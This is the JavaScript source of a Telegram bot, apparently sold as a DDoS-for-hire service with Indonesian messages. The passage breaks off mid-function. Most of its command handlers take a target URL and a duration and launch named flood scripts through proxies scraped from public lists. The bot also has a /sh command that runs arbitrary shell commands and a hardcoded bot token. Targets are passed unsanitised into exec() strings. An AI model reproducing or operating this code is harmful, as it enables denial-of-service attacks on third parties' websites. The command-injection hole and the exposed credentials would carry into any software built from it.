const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const CFonts = require('cfonts');
const figlet = require("figlet")
const token = '7944249117:AAEmxDYpMFvVuQ6AiTefYAIqyGE5LrhFiNE';
const bot = new TelegramBot(token, {polling: true});
const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
const adminIds = adminData.admins;
const port = process.env.PORT || 3000;
const timeLimit = parseInt(adminData.limit, 10);

console.log(figlet.textSync('SkyranXDDoS', {
    font: 'Standard',
    horizontalLayout: 'default',
    vertivalLayout: 'default',
    whitespaceBreak: false
  }))
  
    bot.on('message', (msg) => {
        const nama = msg.from?.first_name || msg.from?.username || 'Anonymous'; // Improved name handling
        const username = msg.from?.username || 'Anonymous'; 
        const userId = msg.from?.id || 'Unknown ID'; // Handle cases where ID might not be available
        const message = msg.text || msg.caption || 'Media atau pesan lain'; // Include caption for media messages

        console.log(`\x1b[97mâ”€â”€âŸ¨ \x1b[42m\x1b[97m[ @${nama} ]\x1b[50m[ @${username} ]\x1b[44m\x1b[35m[ ${userId} ]\x1b[0m`);
        console.log(`\x1b[31mPesan: \x1b[0m${message}\x1b[0m\n`);
    });

let processes = {};
const stopProcesses = (chatId) => {
  if (processes[chatId]) {
    processes[chatId].forEach(proc => proc.kill());
    processes[chatId] = [];
    bot.sendMessage(chatId, 'Proses berhasil dihentikan.');
  } else {
    bot.sendMessage(chatId, 'Tidak ada proses yang berjalan.');
  }
};
const urls = [
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=100',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=110',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=96',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=88',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=5',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=6',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=7',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=8',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=9',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=10',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=12', 
  'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
  'https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
];

async function scrapeProxies(chatId) {
  let proxies = [];
  const totalUrls = urls.length;
  let progressMessage = await bot.sendMessage(chatId, 'Memulai Menganti proxy\n{ 0% }');

  for (let i = 0; i < totalUrls; i++) {
    try {
      const { data } = await axios.get(urls[i]);
      const $ = cheerio.load(data);

      $('tr').each((j, elem) => {
        const ip = $(elem).find('td').eq(0).text().trim();
        const port = $(elem).find('td').eq(1).text().trim();
        if (ip && port) {
          proxies.push(`${ip}:${port}`);
        }
      });
    } catch (error) {
      console.error(`Error scraping ${urls[i]}:`, error);
    }
    const progress = Math.round(((i + 1) / totalUrls) * 100);
    await bot.editMessageText(`Memulai Menganti Proxy\n{ ${progress}% }`, {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });
  }
  fs.writeFileSync('proxy.txt', proxies.join('\n'), 'utf8');
  await bot.editMessageText('Proxy Berhasil Di Perbarui', {
    chat_id: chatId,
    message_id: progressMessage.message_id
  });

  console.log(`Scraped ${proxies.length} proxies and saved to proxy.txt`);
}

bot.onText(/\/start/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`Hallo ${name}, Selamat Datang Di Bot DDoS Zamss-XcV
  
â”€â”€ ð–¥” Nama Bot : Verredtz ð–¥”â”€â”€ 
â”€â”€ ð–¥” Developer : @Zyo ð–¥”â”€â”€ 
â”€â”€ ð–¥” Version : 1.0ð–¥”â”€â”€ 
  
â”€â”€ ð–¥”DDOS PRIVATE METHODSð–¥”â”€â”€ 
/bypass [ Url ] [ Time ]â”€â”€ ð–¥”
/AttackL4 [ Url ] [ Time ]â”€â”€ ð–¥”
/AttackL7 [ Url ] Time ]â”€â”€ ð–¥”
/Tls [ Url ] [ Time ]â”€â”€ ð–¥”
/Tlsvip [ Url ] [ Time ]â”€â”€ ð–¥”
/zamss [ Url ] [ Time ]â”€â”€ ð–¥”
/Zamss-XcV [ Url ] [ Time ]â”€â”€ ð–¥”
/MakLu [ Url ] [ Time ]â”€â”€ ð–¥”
/BapakLu [ Url ] [ Time ]â”€â”€ ð–¥”
/Kontol [ Url ] [ Time ]â”€â”€ ð–¥”
/FLOOD [ Url ] [ Time ]â”€â”€ ð–¥”
/Kill [ Url ] [ Time ]â”€â”€ ð–¥”
/Hunter [ Url ] [ Time ]â”€â”€ ð–¥”
/ExtraKill [ Url ] [ Time ]â”€â”€ ð–¥”
/DarkKill [ Url ] [ Time ]â”€â”€ ð–¥”
/ZamssKill [ Url ] [ Time ]â”€â”€ ð–¥”
/Ghost [ Url ] [ Time ]â”€â”€ ð–¥”
/SuperAttack [ Url ] [ Time ]â”€â”€ ð–¥”
/TrackKill [ Url ] [ Time ]â”€â”€ ð–¥”
  
â”€â”€ ð–¥”Info Web ð–¥”â”€â”€ 
/info [ Url ]â”€â”€ ð–¥”

â”€â”€ ð–¥”Proxy Scraper ð–¥”â”€â”€ 
/upproxy â”€â”€ ð–¥”

â”€â”€ ð–¥”Buy Script ð–¥”â”€â”€ 
/script â”€â”€ ð–¥”

â”€â”€ ð–¥”Cek Status Botð–¥”â”€â”€ 
/cekbot â”€â”€ ð–¥”

â”€â”€ ð–¥”Cek IP Addressð–¥”â”€â”€ 
/cekip [ IP ] â”€â”€ ð–¥”

â”€â”€ ð–¥”Tinyurl Web
/tinyurl [ Url ] â”€â”€ ð–¥”

â”€â”€ ð–¥”Ownerð–¥”â”€â”€ 
/owner â”€â”€ ð–¥”
  

  `);
});

bot.onText(/^\/AttackL7(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node AttackL7.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: AttackL7\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Zamss-XcV(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Zamss-XcV.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Zamss-XcV\nStatus: owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/zamss(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node zamss.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: zamss\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tlsvip(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Tlsvip.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Tlsvip\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tls(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana Kntl?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana Kntl?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Tls.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Tls\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/AttackL4(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node AttackL4.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: AttackL4\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypass(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node bypass.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: bypass\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/loli(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node loli.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: loli\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Kontol(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Kontol.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Kontol\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/FLOOD(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node FLOOD.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: FLOOD.js\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Kill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node StarsXKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Kill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Hunter(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Hunter.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Hunter\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Ghost(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Ghost.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Ghost\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ExtraKill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ExtraKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: ExtraKill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/DarkKill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node DarkKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: DarkKill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ZamssKill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ZamssKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: ZamssKill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/SuperAttack(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node SuperAttack.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: SuperAttack\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/BapakLu(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node BapakLu.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: BapakLu\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/TrackKill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node TrackKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: TrackKill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;

  if (callbackQuery.data === 'stop') {
    const isAdmin = adminIds.includes(chatId.toString());

    if (!isAdmin) {
      bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menghentikan perintah ini.');
      return;
    }
    stopProcesses(chatId);
  }
});

bot.onText(/^\/upproxy$/, async (msg) => {
  const chatId = msg.chat.id;
  const isAdmin = adminIds.includes(chatId.toString());
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  try {
    if (fs.existsSync('proxy.txt')) {
      fs.unlinkSync('proxy.txt');
    }
    await scrapeProxies(chatId);
  } catch (error) {
    bot.sendMessage(chatId, `Terjadi kesalahan saat memperbarui proxy: ${error.message}`);
  }
});


bot.onText(/\/sh (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const command = match[1];
  const isAdmin = adminIds.includes(chatId.toString());
  
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @ZyoXVerredtz');
    return;
  }
  
  exec(command, { maxBuffer: parseInt(adminData.limit) * 1024 }, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Stderr: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Output:\n${stdout}`);
  });
});

bot.onText(/^\/info (.+)/, (msg, match) => {
 const chatId = msg.chat.id;
 const web = match[1];
 const data = {
     target: web,
